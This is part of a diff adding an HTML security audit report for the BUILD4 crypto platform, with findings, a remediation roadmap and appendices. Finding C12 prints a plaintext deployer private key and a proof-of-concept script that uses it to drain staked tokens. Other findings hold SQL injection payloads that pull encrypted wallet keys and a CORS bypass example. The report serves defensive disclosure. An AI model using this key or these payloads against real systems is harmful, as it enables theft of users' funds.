+  <div class="finding sev-high" id="H13"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H13</div><h3 class="finding-title">Aster Client Logs Sensitive Credentials</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-532</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">server/aster-client.ts (multiple lines)</span></div></div><div class="finding-section"><h4>Description</h4><p>HMAC signing messages, session tokens, XSRF tokens, and API key nonces are logged to console. Any log aggregation service becomes a credential store.</p></div></div>
+
+  <div class="finding sev-high" id="H14"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H14</div><h3 class="finding-title">Bounty Wallet Private Key Exposure Risk</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-532</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">server/twitter-agent.ts:276-320</span></div></div><div class="finding-section"><h4>Description</h4><p>The <code>BOUNTY_WALLET_PRIVATE_KEY</code> is used to instantiate an ethers Wallet. Error paths that serialize the wallet object could expose the key in logs.</p></div></div>
+
+  <div class="finding sev-high" id="H15"><div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')"><div class="finding-id mono">KSR-B4-H15</div><h3 class="finding-title">Complete Centralization &mdash; Single EOA Owns All Contracts</h3><span class="badge high">HIGH</span></div><div class="finding-meta"><div class="meta-item"><span class="label">CWE</span><span>CWE-269</span></div><div class="meta-item"><span class="label">Location</span><span class="mono">All 5 contracts</span></div></div><div class="finding-section"><h4>Description</h4><p>All contracts use <code>Ownable(msg.sender)</code> with no timelock, multisig, or governance. The owner can: drain all agent wallets, manipulate fees, deactivate skills, modify constitution rules, and steal staked tokens.</p></div></div>
+
+</section>
+
+<!-- SENTINEL VALIDATION SECTION -->
+<section class="container" id="sentinel-validation">
+  <div class="section-divider" style="background: linear-gradient(90deg, var(--accent-emerald), var(--accent-cyan));"></div>
+  <h2 style="display:flex;align-items:center;gap:12px;">
+    <svg width="28" height="28" viewBox="0 0 28 28" fill="none"><circle cx="14" cy="14" r="13" stroke="#059669" stroke-width="2"/><path d="M8 14.5L12 18.5L20 10.5" stroke="#059669" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    SENTINEL Validation Report
+  </h2>
+  <p>Independent two-pass validation of all findings by the SENTINEL analysis engine.</p>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;margin:24px 0;">
+    <div class="finding" style="border-left:4px solid var(--accent-emerald);text-align:center;padding:20px;">
+      <div style="font-size:36px;font-weight:800;font-family:var(--font-heading);color:var(--accent-emerald);">0</div>
+      <div style="color:var(--text-muted);font-size:12px;text-transform:uppercase;letter-spacing:0.08em;">False Positives</div>
+    </div>
+    <div class="finding" style="border-left:4px solid var(--severity-critical);text-align:center;padding:20px;">
+      <div style="font-size:36px;font-weight:800;font-family:var(--font-heading);color:var(--severity-critical);">13/13</div>
+      <div style="color:var(--text-muted);font-size:12px;text-transform:uppercase;letter-spacing:0.08em;">Criticals Confirmed</div>
+    </div>
+    <div class="finding" style="border-left:4px solid var(--accent-cyan);text-align:center;padding:20px;">
+      <div style="font-size:36px;font-weight:800;font-family:var(--font-heading);color:var(--accent-cyan);">+27</div>
+      <div style="color:var(--text-muted);font-size:12px;text-transform:uppercase;letter-spacing:0.08em;">New Findings Added</div>
+    </div>
+    <div class="finding" style="border-left:4px solid var(--accent-purple);text-align:center;padding:20px;">
+      <div style="font-size:36px;font-weight:800;font-family:var(--font-heading);color:var(--accent-purple);">2</div>
+      <div style="color:var(--text-muted);font-size:12px;text-transform:uppercase;letter-spacing:0.08em;">Validation Passes</div>
+    </div>
+  </div>
+
+  <div class="finding" style="border-left:4px solid var(--accent-emerald);">
+    <h4>Validation Methodology</h4>
+    <p><strong>Pass 1:</strong> Re-validated all 11 original criticals with independent code path analysis. Confirmed each is exploitable as described. Discovered 15 additional findings from files not covered in initial audit (miniapp-routes.ts debug endpoint, .replit secrets, render.yaml deployment config, storage.ts pervasive SQLi surface).</p>
+    <p><strong>Pass 2:</strong> Audited client-side React code, deployment configs, schema definitions, and cross-cutting concerns. Discovered 12 additional findings including CORS wildcard bypass, simulated ZK proofs, unlimited ERC20 approvals, shared analytics auth tokens, and CSP policy weaknesses.</p>
+    <p style="color:var(--accent-emerald);font-weight:600;margin-top:12px;">Verdict: All critical findings are real, exploitable, and represent immediate risk to user funds. Zero false positives detected.</p>
+  </div>
+</section>
+
+<!-- DETAILED FINDINGS — SENTINEL Critical Additions -->
+<section class="container">
+  <div class="section-divider" style="background: linear-gradient(90deg, var(--severity-critical), var(--accent-purple));"></div>
+  <h2>Detailed Findings &mdash; SENTINEL Criticals</h2>
+
+  <div class="finding sev-critical" id="C12">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C12</div>
+      <h3 class="finding-title">Deployer Private Key Hardcoded in .replit Config</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>10.0</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-798</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">.replit:56</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The <code>.replit</code> configuration file contains the deployer's private key in plaintext: <code>DEPLOYER_PRIVATE_KEY = "fbb5ce6442238283335abf13d09d2419827a7f60774cda24f610097ecafa87de"</code>. This key was used to deploy all 6 smart contracts on BSC. Since the repository is public on GitHub, the key is <strong>already compromised</strong>. The project's own <code>replit.md</code> acknowledges this key is exposed.</p></div>
+    <div class="finding-section"><h4>Impact</h4><p>Anyone with this key can call owner-only functions on all deployed contracts: drain staked tokens, manipulate agent balances, modify fee structures, deactivate the entire platform. If the deployer wallet still holds BNB, those funds are also at risk.</p></div>
+    <div class="finding-section"><h4>Proof of Concept</h4>
+<pre><code>// Import the exposed key and interact with any deployed contract
+const { ethers } = require('ethers');
+const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');
+const wallet = new ethers.Wallet(
+  'fbb5ce6442238283335abf13d09d2419827a7f60774cda24f610097ecafa87de',
+  provider
+);
+// wallet is now the owner of all contracts — can call any onlyOwner function
+const staking = new ethers.Contract(STAKING_ADDR, ABI, wallet);
+await staking.emergencyWithdraw(); // drain all staked tokens</code></pre></div>
+    <div class="finding-section"><h4>Remediation</h4><p>1. <strong>Immediately</strong> transfer ownership of all contracts to a new address controlled by a fresh key. 2. Drain any remaining funds from the compromised deployer wallet. 3. Remove the private key from the repository and all git history (<code>git filter-repo</code>). 4. Use a hardware wallet or multisig for future deployments. 5. Never store private keys in config files.</p></div>
+  </div>
+
+  <div class="finding sev-critical" id="C13">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-C13</div>
+      <h3 class="finding-title">WALLET_ENCRYPTION_KEY Missing from Production Deployment</h3>
+      <span class="badge critical">CRITICAL</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>10.0</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-798</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">render.yaml (envVars section)</span></div>
+      <div class="meta-item"><span class="label">Status</span><span class="status open">Open</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The <code>render.yaml</code> production deployment configuration lists all environment variables but does <strong>NOT</strong> include <code>WALLET_ENCRYPTION_KEY</code>. This confirms that the hardcoded default key from C01 (<code>"build4-beehave-prod-stable-encryption-key-2026"</code>) is the <strong>actual key used in production</strong> to encrypt all user private keys. This upgrades C01 from theoretical to confirmed.</p></div>
+    <div class="finding-section"><h4>Impact</h4><p>Confirms that C01 + C02 form a complete kill chain: SQLi to extract encrypted keys &rarr; decrypt with the publicly known hardcoded key &rarr; drain all user wallets. No environment-specific key override exists in production.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>1. Add <code>WALLET_ENCRYPTION_KEY</code> to <code>render.yaml</code> as a required secret. 2. Generate a cryptographically random 256-bit key. 3. Re-encrypt all stored private keys. 4. Add startup validation that fails if the key is not set (remove the hardcoded fallback).</p></div>
+  </div>
+</section>
+
+<!-- DETAILED FINDINGS — SENTINEL High Additions -->
+<section class="container">
+  <div class="section-divider" style="background: linear-gradient(90deg, var(--severity-high), var(--severity-medium));"></div>
+  <h2>Detailed Findings &mdash; SENTINEL Highs</h2>
+
+  <div class="finding sev-high" id="H16">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H16</div>
+      <h3 class="finding-title">CORS Origin Bypass via Wildcard Matching</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>7.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-346</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/index.ts:107-110</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The CORS origin validation uses <code>origin.includes("walletconnect")</code> to whitelist origins. An attacker can register a domain like <code>evil-walletconnect.com</code> or <code>walletconnect.attacker.com</code> and pass the CORS check, enabling cross-origin requests with credentials to the BUILD4 API from a malicious site.</p></div>
+    <div class="finding-section"><h4>Proof of Concept</h4>
+<pre><code>// Attacker hosts JavaScript on https://walletconnect.evil.com
+// Browser sends: Origin: https://walletconnect.evil.com
+// Server check: "walletconnect.evil.com".includes("walletconnect") === true
+// CORS header returned: Access-Control-Allow-Origin: https://walletconnect.evil.com
+// Attacker can now make authenticated cross-origin requests</code></pre></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Replace <code>.includes()</code> with exact origin matching against a whitelist array. Use <code>===</code> comparison or validate the full hostname suffix.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H17">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H17</div>
+      <h3 class="finding-title">Pervasive SQL Injection Surface in storage.ts (30+ Locations)</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.6</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-89</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/storage.ts (30+ sql.raw() calls)</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>Beyond the single SQLi in routes.ts (C02), <code>storage.ts</code> contains <strong>30+ instances</strong> of <code>sql.raw()</code> with string interpolation across search, analytics, leaderboard, referral, and wallet management functions. Many accept user-controlled parameters that flow through from API routes, Telegram commands, or agent queries. This is not a single vulnerability but a systemic pattern throughout the entire data layer.</p></div>
+    <div class="finding-section"><h4>Proof of Concept</h4>
+<pre><code>// Example: searchAgents() in storage.ts
+db.execute(sql.raw(`SELECT * FROM agents WHERE LOWER(name) LIKE LOWER('%${query}%')`))
+// Inject: query = "') UNION SELECT encrypted_private_key FROM telegram_wallets--"
+
+// Example: getLeaderboard() in storage.ts
+db.execute(sql.raw(`SELECT ... ORDER BY ${sortField} ${sortDir} LIMIT ${limit}`))
+// Inject: sortField = "(SELECT encrypted_private_key FROM telegram_wallets LIMIT 1)"</code></pre></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Systematic audit and replacement of ALL <code>sql.raw()</code> calls with Drizzle ORM's parameterized query builder. Use <code>sql`...${param}...`</code> template literals (which auto-parameterize) instead of <code>sql.raw(`...${param}...`)</code> (which does not).</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H18">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H18</div>
+      <h3 class="finding-title">Debug Balance Endpoint Leaks Sensitive Data in Production</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>7.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-489</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/miniapp-routes.ts:6-76</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The <code>/api/miniapp/debug-balance</code> endpoint is a debug tool left active in production. It accepts an unauthenticated <code>chatId</code> parameter and returns detailed wallet information, balances, transaction history, and internal state for any user. Combined with the zero-auth MiniApp API (C03), this provides a complete reconnaissance tool.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Remove the debug endpoint entirely, or gate it behind admin authentication and a <code>NODE_ENV !== 'production'</code> check.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H19">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H19</div>
+      <h3 class="finding-title">CSP Allows unsafe-inline and unsafe-eval in Production</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>6.8</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-1021</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/index.ts:126</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The Content Security Policy header includes <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code> directives, effectively negating XSS protection. Any injection point (including the SEO prerender HTML injection in M05) can execute arbitrary JavaScript in the user's browser context.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Remove <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code>. Use nonce-based CSP for inline scripts. Refactor any code that relies on <code>eval()</code>.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H20">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H20</div>
+      <h3 class="finding-title">Simulated ZK Proofs &mdash; Fake Groth16 in zerc20-sdk</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>8.2</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-345</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/zerc20-sdk (Poseidon hash + Groth16)</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The zerc20-sdk claims to implement Groth16 zero-knowledge proofs for private transactions, but the implementation is <strong>entirely simulated</strong>. The Poseidon hash uses truncated JavaScript arithmetic (loses precision on large values), and the "proof generation" produces deterministic fake proofs that pass the local "verifier" but have no cryptographic validity. Any user relying on ZERC20 for transaction privacy has zero actual privacy.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Either implement real ZK proofs using a proper library (snarkjs, circom) with a trusted setup, or remove the ZK claims entirely and label the feature as experimental/simulated.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H21">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H21</div>
+      <h3 class="finding-title">Unlimited ERC20 Approval (type(uint256).max) Client-Side</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>7.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-863</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">client/src/hooks (DeFi hooks)</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>Client-side DeFi hooks request <code>type(uint256).max</code> (infinite) token approvals to router contracts. If any approved contract is compromised or has an upgrade path, all approved tokens can be drained from user wallets without further interaction. Users are never informed of the risk or given the option to approve exact amounts.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Default to exact-amount approvals. If using unlimited approvals for UX, clearly inform the user and provide a "revoke" mechanism. Implement approval amount as a user-configurable setting.</p></div>
+  </div>
+
+  <div class="finding sev-high" id="H22">
+    <div class="finding-header" onclick="this.closest('.finding').classList.toggle('collapsed')">
+      <div class="finding-id mono">KSR-B4-H22</div>
+      <h3 class="finding-title">Shared Auth Token Across All Analytics Sessions</h3>
+      <span class="badge high">HIGH</span>
+    </div>
+    <div class="finding-meta">
+      <div class="meta-item"><span class="label">CVSS 4.0</span><span>6.5</span></div>
+      <div class="meta-item"><span class="label">CWE</span><span>CWE-384</span></div>
+      <div class="meta-item"><span class="label">Location</span><span class="mono">server/admin-auth.ts</span></div>
+    </div>
+    <div class="finding-section"><h4>Description</h4><p>The analytics dashboard uses a single shared HMAC-derived token for all sessions. There is no per-session token, no expiration, and no revocation mechanism. If the token is leaked (logs, browser history, shoulder surfing), all analytics access is permanently compromised with no way to invalidate the token without changing the server secret.</p></div>
+    <div class="finding-section"><h4>Remediation</h4><p>Implement per-session tokens with expiration (JWT with short TTL). Add session revocation. Use HttpOnly, Secure cookies instead of URL-based tokens.</p></div>
+  </div>
+
+</section>
+
+<!-- REMEDIATION ROADMAP -->
+<section id="roadmap" class="container">
+  <div class="section-divider"></div>
+  <h2>Remediation Roadmap</h2>
+
+  <div class="roadmap-phase phase-critical">
+    <h4 style="color:var(--severity-critical)">Phase 1 &mdash; Immediate (0-48 hours) &mdash; BLOCK PRODUCTION LAUNCH</h4>
+    <ul>
+      <li><strong>Rotate encryption key</strong> &mdash; Remove hardcoded default, deploy unique key via secrets manager, re-encrypt all stored keys</li>
+      <li><strong>Fix ALL SQL injection</strong> &mdash; Replace 30+ <code>sql.raw()</code> calls with parameterized queries across storage.ts and routes.ts</li>
+      <li><strong>Add MiniApp authentication</strong> &mdash; Implement Telegram initData HMAC verification on all <code>/api/miniapp/*</code> endpoints</li>
+      <li><strong>Replace vm sandbox</strong> &mdash; Switch to <code>isolated-vm</code> for skill execution</li>
+      <li><strong>Stop sending private keys via Telegram</strong> &mdash; Use one-time HTTPS pages instead</li>
+      <li><strong>Clear in-memory key caches</strong> &mdash; Add TTL and encrypt keys in memory</li>
+      <li><strong>Add auth to stealth buy system</strong></li>
+      <li><strong>Fix ERC20 return value handling</strong> &mdash; Use SafeERC20</li>
+      <li><strong>Transfer contract ownership</strong> &mdash; Deployer key in .replit is publicly exposed, rotate NOW</li>
+      <li><strong>Set WALLET_ENCRYPTION_KEY in production</strong> &mdash; render.yaml confirms hardcoded key is used</li>
+      <li><strong>Remove debug-balance endpoint</strong> &mdash; Unauthenticated data leak in production</li>
+    </ul>
+  </div>
+
+  <div class="roadmap-phase phase-high">
+    <h4 style="color:var(--severity-high)">Phase 2 &mdash; Short-term (1-2 weeks)</h4>
+    <ul>
+      <li>Implement prompt injection detection across all LLM interfaces</li>
+      <li>Reduce slippage to 1-3%, integrate private mempool</li>
+      <li>Use full 256-bit HMAC for wallet linking, require SESSION_SECRET</li>
+      <li>Sign and validate Telegram callback data with HMAC</li>
+      <li>Fix CORS origin validation &mdash; replace <code>.includes()</code> with exact match whitelist</li>
+      <li>Remove <code>unsafe-inline</code> and <code>unsafe-eval</code> from CSP</li>
+      <li>Block private IP ranges in outreach system (SSRF fix)</li>
+      <li>Encrypt Twitter API credentials at rest</li>
+      <li>Fix creditAgent insolvency risk (require real BNB backing)</li>
+      <li>Add timelock + multisig to smart contract ownership</li>
+      <li>Replace simulated ZK proofs with real implementation or remove privacy claims</li>
+      <li>Switch to exact-amount ERC20 approvals client-side</li>
+      <li>Implement per-session analytics tokens with expiration</li>
+      <li>Fix addRewards() to distribute remaining rewards before overwriting rate</li>
+      <li>Remove DATABASE_URL as encryption key source</li>
+      <li>Redact all credential logging in aster-client</li>
+    </ul>
+  </div>
+
+  <div class="roadmap-phase phase-medium">
+    <h4 style="color:var(--severity-medium)">Phase 3 &mdash; Medium-term (1 month)</h4>
+    <ul>
+      <li>Add authentication to all public API endpoints</li>
+      <li>Persist rate limits in Redis (survive restarts)</li>
+      <li>Add CSRF protection to wallet link pages</li>
+      <li>Validate agent ownership on all queries</li>
+      <li>Sanitize agent names/bios for prompt injection</li>
+      <li>Fix SEO prerender HTML injection</li>
+      <li>Add bounty verification with content analysis (not just LLM scoring)</li>
+      <li>Implement proper audit logging for all financial operations</li>
+    </ul>
+  </div>
+
+  <div class="roadmap-phase phase-low">
+    <h4 style="color:var(--severity-low)">Phase 4 &mdash; Backlog</h4>
+    <ul>
+      <li>Replace innerHTML with textContent in wallet pages</li>
+      <li>Add memory exhaustion protection (LRU caches)</li>
+      <li>Sanitize error messages in external responses</li>
+      <li>Implement proper credential rotation policies</li>
+      <li>Commission formal smart contract audit with automated tools (Slither, Mythril)</li>
+    </ul>
+  </div>
+</section>
+
+<!-- APPENDICES -->
+<section class="container">
+  <div class="section-divider"></div>
+  <h2>Appendices</h2>
+
+  <div class="finding" style="border-left: 4px solid var(--accent-cyan);">
+    <h4>A. Audit Methodology</h4>
+    <p>Manual source code review (100% coverage of server-side TypeScript), smart contract analysis (Solidity 0.8.24), OWASP Top 10 Web + Web3, prompt injection testing, authentication/authorization review, cryptographic implementation analysis, and business logic review of financial flows.</p>
+  </div>
+
+  <div class="finding" style="border-left: 4px solid var(--accent-cyan);">
+    <h4>B. Severity Classification</h4>
+    <ul style="color:var(--text-secondary); padding-left:20px;">
+      <li><strong style="color:var(--severity-critical)">Critical (CVSS 9.0-10.0)</strong> &mdash; Direct loss of funds, full system compromise, or mass user impact with no user interaction required</li>
+      <li><strong style="color:var(--severity-high)">High (CVSS 7.0-8.9)</strong> &mdash; Significant financial loss, data breach, or system compromise requiring minimal attacker capability</li>
+      <li><strong style="color:var(--severity-medium)">Medium (CVSS 4.0-6.9)</strong> &mdash; Limited impact, requires specific conditions or user interaction</li>
+      <li><strong style="color:var(--severity-low)">Low (CVSS 0.1-3.9)</strong> &mdash; Minimal impact, defense-in-depth violations, informational issues</li>
+    </ul>
+  </div>
+
+  <div class="finding" style="border-left: 4px solid var(--accent-cyan);">
+    <h4>C. Disclaimer</h4>
+    <p>This audit was performed on a specific commit of the BUILD4 repository as of April 6, 2026. The findings reflect the state of the code at that time. Security audits cannot guarantee the absence of all vulnerabilities. This report is provided for informational purposes to the BUILD4 team and should be treated as confidential until all critical issues are resolved.</p>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer class="report-footer container">
+  <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:8px;">
+    <svg width="24" height="24" viewBox="0 0 140 140"><polygon points="70,8 128,38 128,102 70,132 12,102 12,38" fill="none" stroke="rgba(200,210,220,0.25)" stroke-width="2.5"/><circle cx="70" cy="70" r="18" fill="rgba(200,210,220,0.08)"/><text x="70" y="76" text-anchor="middle" font-family="'Bricolage Grotesque',sans-serif" font-size="22" font-weight="800" fill="#94A3B8">K</text><circle cx="70" cy="8" r="6" fill="#9B7FE6"/><circle cx="128" cy="38" r="6" fill="#00D4CC"/><circle cx="128" cy="102" r="6" fill="#4A90D9"/><circle cx="70" cy="132" r="6" fill="#B4A7D6"/><circle cx="12" cy="102" r="6" fill="#7DD4E8"/><circle cx="12" cy="38" r="6" fill="#A8C8E8"/></svg>
+    <span style="font-family:var(--font-heading);font-weight:800;font-size:14px;letter-spacing:0.12em;color:var(--text-primary);">KAIROS LAB</span>
+  </div>
+  <p>Confidential &mdash; BUILD4 Security Audit Report &mdash; April 2026 &mdash; v1.0</p>
+  <p style="margin-top:12px; font-size:11px;">This document contains confidential security findings. Unauthorized distribution is prohibited.</p>
+</footer>
+
+<script>
+// Collapse all findings by default except first
+document.querySelectorAll('.finding').forEach((f, i) => { if(i > 0) f.classList.add('collapsed'); });
+
+// Smooth scroll
+document.querySelectorAll('a[href^="#"]').forEach(a => {
+  a.addEventListener('click', function(e) {
+    e.preventDefault();
+    const t = document.querySelector(this.getAttribute('href'));
+    if(t) { t.scrollIntoView({behavior:'smooth', block:'start'}); t.closest('.finding')?.classList.remove('collapsed'); }
+  });
+});
+
+// Animate bars on scroll
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => { if(e.isIntersecting) { e.target.querySelectorAll('.bar-fill').forEach(b => { const w = b.style.width; b.style.width = '0'; setTimeout(() => b.style.width = w, 100); }); } });
+}, {threshold: 0.3});
+document.querySelectorAll('.chart-container').forEach(c => observer.observe(c));
+</script>
+
+</body>
+</html>
